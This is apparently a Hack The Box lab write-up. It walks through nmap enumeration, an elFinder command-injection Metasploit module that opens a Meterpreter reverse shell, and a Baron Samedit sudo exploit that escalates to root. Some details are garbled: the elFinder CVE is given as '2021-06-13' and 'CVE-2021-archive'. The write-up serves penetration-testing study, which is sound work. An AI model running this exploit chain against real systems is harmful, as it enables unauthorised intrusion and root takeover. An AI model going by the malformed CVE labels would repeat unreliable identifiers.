**Module:** Using the Metasploit Framework  
**Target:** 10.129.30.183  
**Attacker:** 10.10.14.171
### Enumeration
```bash
db_nmap -sV -sS -sC 10.129.30.183 --min-rate 1000
```

**Findings:**
- Port 22: OpenSSH 8.2p1 (Ubuntu)
- Port 80: Apache 2.4.41 — elFinder 2.1.x with PHP connector
### Exploitation — elFinder RCE
Searched for an elFinder exploit:
```bash
search elFinder
use exploit/linux/http/elfinder_archive_cmd_injection
```

**CVE:** 2021-06-13 — Command injection via archive creation in elFinder 2.1.53.

```bash
set RHOSTS 10.129.30.183
set LHOST 10.10.14.171
run
```

Exploit uploaded a text file, created a malicious zip archive, served a payload via HTTP stager, and opened a Meterpreter session.

```
[*] Meterpreter session 1 opened (10.10.14.171:4444 -> 10.129.30.183:60396)
```
### Post-Exploitation — Session 1 (www-data)
```bash
getuid
# Server username: www-data
```

Dropped into a shell to check sudo version:
```bash
shell
sudo --version
# Sudo version 1.8.31
exit
background
```
### Privilege Escalation — Baron Samedit (CVE-2021-3156)
Searched for a matching local exploit:
```bash
search sudo 1.8.31
use exploit/linux/local/sudo_baron_samedit
```

**Vulnerability:** Heap-based buffer overflow in sudo ≤ 1.8.31 allowing local privilege escalation to root.
```bash
set LHOST 10.10.14.171
set SESSION 1
run
```

> Note: got a warning about incompatible session architecture (x86 vs x64), but the exploit succeeded regardless, opening a new x64 Meterpreter session as root.

```
[*] Meterpreter session 2 opened (10.10.14.171:4444 -> 10.129.30.183:60476)
```

Confirmed root:
```bash
shell
sudo -l
# User root may run (ALL : ALL) ALL
```
### Flag
```bash
cd /root
cat flag.txt
# HTB{5e55ion5_4r3_sw33t}
```
### Attack Chain Summary
```
Nmap scan → elFinder 2.1.53 on port 80
→ CVE-2021-archive cmd injection → shell as www-data
→ sudo --version → 1.8.31 identified
→ Baron Samedit (CVE-2021-3156) → root
→ /root/flag.txt
```
### Lessons Learned
- `db_nmap` inside msfconsole auto-populates the database — always prefer it over plain nmap during MSF engagements
- Check sudo version immediately after foothold — Baron Samedit affected a huge range of Linux distros up to early 2021
- Architecture mismatches between sessions (x86 vs x64) throw warnings but don't always block execution — try anyway and set the target explicitly if needed
- `background` + `SESSION` option is the standard flow for chaining a local privesc module onto an existing foothold session